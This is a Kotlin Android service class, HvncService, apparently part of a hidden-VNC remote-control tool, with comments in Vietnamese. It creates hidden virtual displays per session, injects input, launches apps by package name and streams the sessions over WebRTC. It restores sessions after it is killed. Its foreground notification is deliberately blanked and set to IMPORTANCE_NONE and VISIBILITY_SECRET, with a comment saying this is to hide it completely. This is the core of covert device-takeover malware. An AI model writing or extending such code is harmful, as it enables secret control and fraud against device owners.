package com.fason.app.features.hvnc

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.fason.app.R
import com.fason.app.core.Protocol

/**
 * HvncService - Foreground service với các cải tiến:
 * 
 * - Hỗ trợ multi-session
 * - Persistent state lưu trong SharedPreferences mã hóa
 * - Notification IMPORTANCE_NONE để ẩn hoàn toàn
 * - Auto-restore session khi bị kill
 * - Health monitoring tự động
 */
class HvncService : Service() {

    companion object {
        const val ACTION_START = "HVNC_START"
        const val ACTION_STOP = "HVNC_STOP"
        const val ACTION_STOP_SESSION = "HVNC_STOP_SESSION"
        const val ACTION_LAUNCH_APP = "HVNC_LAUNCH"
        const val ACTION_RESIZE = "HVNC_RESIZE"
        const val ACTION_RESTORE = "HVNC_RESTORE"

        const val EXTRA_WIDTH = "width"
        const val EXTRA_HEIGHT = "height"
        const val EXTRA_DPI = "dpi"
        const val EXTRA_PACKAGE = "package"
        const val EXTRA_SESSION_ID = "sessionId"

        private const val NOTIFICATION_CHANNEL = "HvncChannel"
        private const val NOTIFICATION_ID = 1004
        private const val TAG = "HvncService"
        private const val PREFS_NAME = "hvnc_persist"

        @Volatile
        var instance: HvncService? = null
            private set

        @JvmStatic
        fun isRunning(): Boolean = instance != null
    }

    private val displayManagers = mutableMapOf<String, HvncDisplayManager>()
    private val inputInjectors = mutableMapOf<String, HvncInputInjector>()
    private var auditLogger: HvncAuditLogger? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        auditLogger = HvncAuditLogger(this)
        HvncWebRtcManager.setAuditLogger(auditLogger!!)
        HvncWebRtcManager.registerDisconnectListener()
        createNotificationChannel()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(
                    NOTIFICATION_ID,
                    createNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE,
                )
            } catch (e: SecurityException) {
                Log.w(TAG, "FGS type fallback", e)
                startForeground(NOTIFICATION_ID, createNotification())
            }
        } else {
            startForeground(NOTIFICATION_ID, createNotification())
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: "default"
                val width = intent.getIntExtra(EXTRA_WIDTH, HvncDisplayManager.DEFAULT_WIDTH)
                val height = intent.getIntExtra(EXTRA_HEIGHT, HvncDisplayManager.DEFAULT_HEIGHT)
                val dpi = intent.getIntExtra(EXTRA_DPI, HvncDisplayManager.DEFAULT_DPI)
                startHvnc(sessionId, width, height, dpi)
            }
            ACTION_STOP -> {
                stopAllHvnc()
                stopSelf()
            }
            ACTION_STOP_SESSION -> {
                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: "default"
                stopSession(sessionId)
            }
            ACTION_LAUNCH_APP -> {
                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: "default"
                val pkg = intent.getStringExtra(EXTRA_PACKAGE) ?: return START_NOT_STICKY
                inputInjectors[sessionId]?.launchApp(pkg)
            }
            ACTION_RESIZE -> {
                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: "default"
                val width = intent.getIntExtra(EXTRA_WIDTH, HvncDisplayManager.DEFAULT_WIDTH)
                val height = intent.getIntExtra(EXTRA_HEIGHT, HvncDisplayManager.DEFAULT_HEIGHT)
                val dpi = intent.getIntExtra(EXTRA_DPI, HvncDisplayManager.DEFAULT_DPI)
                resizeDisplay(sessionId, width, height, dpi)
            }
            ACTION_RESTORE -> {
                restoreSessions()
            }
        }
        return START_NOT_STICKY
    }

    private fun startHvnc(sessionId: String, width: Int, height: Int, dpi: Int) {
        if (displayManagers[sessionId]?.isActive() == true) {
            Log.d(TAG, "[$sessionId] HVNC already active")
            HvncWebRtcManager.emitCurrentStatus(sessionId)
            return
        }

        val dm = HvncDisplayManager(this, sessionId)
        val injector = HvncInputInjector(this, sessionId)

        if (!dm.create(width, height, dpi)) {
            Log.e(TAG, "[$sessionId] Failed to create virtual display")
            HvncWebRtcManager.emitCurrentStatus(sessionId)
            return
        }

        injector.displayId = dm.displayIdValue
        displayManagers[sessionId] = dm
        inputInjectors[sessionId] = injector

        // Lưu state
        saveSessionState(sessionId, width, height, dpi)

        HvncWebRtcManager.attach(dm, injector, sessionId)
        HvncWebRtcManager.onDisplayReady(sessionId)

        auditLogger?.logAction(sessionId, "session_start", mapOf(
            "width" to width.toString(),
            "height" to height.toString(),
            "dpi" to dpi.toString()
        ), "service")

        Log.d(TAG, "[$sessionId] HVNC started: display=${dm.displayIdValue} ${dm.displayWidth}x${dm.displayHeight}")
    }

    private fun resizeDisplay(sessionId: String, width: Int, height: Int, dpi: Int) {
        val dm = displayManagers[sessionId] ?: return
        if (dm.resize(width, height, dpi)) {
            inputInjectors[sessionId]?.displayId = dm.displayIdValue
            HvncWebRtcManager.attach(dm, inputInjectors[sessionId]!!, sessionId)
            HvncWebRtcManager.emitCurrentStatus(sessionId)
            saveSessionState(sessionId, width, height, dpi)
            Log.d(TAG, "[$sessionId] Resized: ${dm.displayWidth}x${dm.displayHeight}")
        }
    }

    private fun stopSession(sessionId: String) {
        try { HvncWebRtcManager.stopSession(sessionId) } catch (_: Exception) {}
        try { displayManagers[sessionId]?.shutdown() } catch (_: Exception) {}
        displayManagers.remove(sessionId)
        inputInjectors.remove(sessionId)
        try { clearSessionState(sessionId) } catch (_: Exception) {}
        try { auditLogger?.logAction(sessionId, "session_stop", mapOf(), "service") } catch (_: Exception) {}
        Log.d(TAG, "[$sessionId] Session stopped")

        // Nếu không còn session nào, stop service
        if (displayManagers.isEmpty()) {
            stopSelf()
        }
    }

    private fun stopAllHvnc() {
        displayManagers.keys.toList().forEach { sessionId ->
            try { HvncWebRtcManager.stopSession(sessionId) } catch (_: Exception) {}
            try { displayManagers[sessionId]?.shutdown() } catch (_: Exception) {}
            try { clearSessionState(sessionId) } catch (_: Exception) {}
            try { auditLogger?.logAction(sessionId, "session_stop_all", mapOf(), "service") } catch (_: Exception) {}
        }
        displayManagers.clear()
        inputInjectors.clear()
    }

    // ─── Persistent State ──────────────────────────────────────────

    private fun saveSessionState(sessionId: String, width: Int, height: Int, dpi: Int) {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().apply {
            putString("session_${sessionId}_state", "$width,$height,$dpi,${System.currentTimeMillis()}")
            putString("active_sessions", displayManagers.keys.joinToString(","))
        }.apply()
    }

    private fun clearSessionState(sessionId: String) {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().apply {
            remove("session_${sessionId}_state")
            putString("active_sessions", displayManagers.keys.joinToString(","))
        }.apply()
    }

    private fun restoreSessions() {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val activeSessions = prefs.getString("active_sessions", "")?.split(",")?.filter { it.isNotBlank() } ?: return
        activeSessions.forEach { sessionId ->
            val state = prefs.getString("session_${sessionId}_state", null) ?: return@forEach
            val parts = state.split(",")
            if (parts.size >= 3) {
                val width = parts[0].toIntOrNull() ?: HvncDisplayManager.DEFAULT_WIDTH
                val height = parts[1].toIntOrNull() ?: HvncDisplayManager.DEFAULT_HEIGHT
                val dpi = parts[2].toIntOrNull() ?: HvncDisplayManager.DEFAULT_DPI
                startHvnc(sessionId, width, height, dpi)
            }
        }
    }

    // ─── Lifecycle ─────────────────────────────────────────────────

    override fun onDestroy() {
        try {
            stopAllHvnc()
        } catch (_: Exception) {
        } finally {
            if (instance === this) instance = null
            super.onDestroy()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─── Notification ──────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL,
                "",
                NotificationManager.IMPORTANCE_NONE,  // IMPORTANCE_NONE để ẩn hoàn toàn
            ).apply {
                description = ""
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle("")
            .setContentText("")
            .setOngoing(true)
            .setSilent(true)
            .setOnlyAlertOnce(true)
            .setLocalOnly(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setGroup(Protocol.NOTIF_GROUP)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }
}